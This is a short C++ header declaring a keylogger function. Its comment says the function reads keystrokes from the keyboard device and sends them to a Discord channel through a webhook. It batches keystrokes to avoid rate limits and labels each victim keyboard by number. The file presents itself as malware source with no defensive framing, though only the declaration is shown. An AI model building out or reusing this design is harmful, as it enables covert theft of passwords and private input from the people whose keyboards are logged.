#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#define NUM_EVENTS 128

/**
 * Captures keystrokes by reading from the keyboard resource and sending
 * message through webhook. Continues reading until SIGINT is received. 
 * Sends message only when a set number of keystrokes is captured
 * (to go around rate limitation)
 *
 * \param keyboard The file descriptor for the keyboard input file
 * \param bot Cluster reference
 * \param wh Webhook reference
 * \param keyb_num Keyboard number(used to differentiate various keyboards in discord channel)
 */
void keylogger(int keyboard, dpp::cluster& bot, dpp::webhook& wh, int keyb_num);

#endif